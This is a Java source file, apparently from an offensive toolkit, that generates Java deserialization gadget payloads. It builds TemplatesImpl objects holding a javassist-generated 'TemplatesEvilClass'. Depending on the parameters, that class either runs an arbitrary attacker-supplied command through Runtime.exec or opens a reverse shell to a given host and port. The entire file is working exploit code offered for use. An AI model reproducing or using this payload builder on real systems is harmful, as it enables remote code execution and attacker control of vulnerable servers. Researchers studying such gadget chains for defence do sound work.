package com.example.exploit;

import com.example.exploit.template.ReverseShellTemplate;
import com.example.exploit.util.MiscUtil;
import com.example.exploit.util.ReflectUtil;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import javassist.CtField;

import java.util.Base64;
import java.util.Hashtable;

public class Gadgets {
    public static TemplatesImpl createTemplatesImpl(Hashtable<String, String> params) throws Exception {
        String cmd = params.get("cmd");
        String type = params.get("type");
        String host = params.get("host");
        String port = params.get("port");
        String shell = params.get("shell");

        if (cmd != null) {
            if ("base64".equals(type)) {
                cmd = new String(Base64.getDecoder().decode(cmd));
            }
            System.out.println("[Deserialize] Cmd: " + cmd);
            return createTemplatesImpl(cmd);
        } else if (host != null && port != null) {
            if (shell == null) {
                shell = "sh";
            }
            System.out.println("[Deserialize] Host: " + host + " Port: " + port + " Shell: " + shell);
            return createTemplatesImpl(host, Integer.parseInt(port), shell);
        } else {
              throw new Exception("Invalid params");
        }
    }

    protected static TemplatesImpl createTemplatesImpl(String command) throws Exception {
        TemplatesImpl templatesImpl = new TemplatesImpl();
        ClassPool pool = ClassPool.getDefault();

        String body = String.format("java.lang.Runtime.getRuntime().exec(\"%s\");", command);

        CtClass clazz = pool.makeClass("TemplatesEvilClass_" + MiscUtil.getRandStr(12));
        CtClass superClazz = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        clazz.setSuperclass(superClazz);

        CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);
        constructor.setBody(body);
        clazz.addConstructor(constructor);

        ReflectUtil.setFieldValue(templatesImpl, "_name", "Hello");
        ReflectUtil.setFieldValue(templatesImpl, "_bytecodes", new byte[][]{clazz.toBytecode()});
        ReflectUtil.setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());

        return templatesImpl;
    }

    protected static TemplatesImpl createTemplatesImpl(String host, int port, String shell) throws Exception {
        TemplatesImpl templatesImpl = new TemplatesImpl();
        ClassPool pool = ClassPool.getDefault();

        CtClass clazz = pool.get(ReverseShellTemplate.class.getName());
        CtClass superClazz = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        clazz.setSuperclass(superClazz);

        ReflectUtil.setCtField(clazz, "host", CtField.Initializer.constant(host));
        ReflectUtil.setCtField(clazz, "port", CtField.Initializer.constant(port));
        ReflectUtil.setCtField(clazz, "shell", CtField.Initializer.constant(shell));

        clazz.replaceClassName(clazz.getName(), "TemplatesEvilClass_" + MiscUtil.getRandStr(12));

        ReflectUtil.setFieldValue(templatesImpl, "_name", "Hello");
        ReflectUtil.setFieldValue(templatesImpl, "_bytecodes", new byte[][]{clazz.toBytecode()});
        ReflectUtil.setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());

        return templatesImpl;
    }
}
